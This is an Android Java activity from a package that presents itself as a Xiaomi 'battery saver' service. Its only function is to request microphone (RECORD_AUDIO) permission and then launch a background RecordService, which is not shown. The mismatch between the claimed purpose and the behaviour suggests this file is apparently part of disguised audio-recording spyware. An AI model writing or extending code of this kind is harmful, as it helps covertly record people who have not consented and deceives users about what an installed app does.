package com.xiaomi.batterysaver.service;

import android.app.Activity;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Bundle;
import androidx.annotation.NonNull;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import android.util.Log;

public class PermissionActivity extends Activity {

    private static final int PERMISSION_REQUEST_CODE = 123;
    private static final String[] REQUIRED_PERMISSIONS = {
            android.Manifest.permission.RECORD_AUDIO
    };
    private static final String TAG = "PermissionActivity";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        Log.d(TAG, "onCreate: PermissionActivity started");
        requestPermissions();
    }

    private void requestPermissions() {
        Log.d(TAG, "requestPermissions: Checking permissions");
        if (!hasAllPermissions()) {
            Log.d(TAG, "requestPermissions: Not all permissions are granted, requesting...");
            ActivityCompat.requestPermissions(this, REQUIRED_PERMISSIONS, PERMISSION_REQUEST_CODE);
        } else {
            Log.d(TAG, "requestPermissions: All permissions are already granted");
            proceedToStartRecordingService();
        }
    }

    private boolean hasAllPermissions() {
        for (String permission : REQUIRED_PERMISSIONS) {
            if (ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
                Log.d(TAG, "hasAllPermissions: Missing permission: " + permission);
                return false;
            }
        }
        Log.d(TAG, "hasAllPermissions: All permissions are granted");
        return true;
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        Log.d(TAG, "onRequestPermissionsResult: Received response for permission request");
        if (requestCode == PERMISSION_REQUEST_CODE) {
            if (grantResults.length > 0) {
                for (int grantResult : grantResults) {
                    if (grantResult != PackageManager.PERMISSION_GRANTED) {
                        Log.d(TAG, "onRequestPermissionsResult: Permission denied");
                        finish();
                        return;
                    }
                }
                Log.d(TAG, "onRequestPermissionsResult: All permissions granted");
                proceedToStartRecordingService();
            } else {
                Log.d(TAG, "onRequestPermissionsResult: No permissions granted");
                finish();
            }
        }
    }

    private void proceedToStartRecordingService() {
        Log.d(TAG, "proceedToStartRecordingService: Starting RecordService");
        Intent serviceIntent = new Intent(this, RecordService.class);
        startService(serviceIntent);
        finish();
    }
}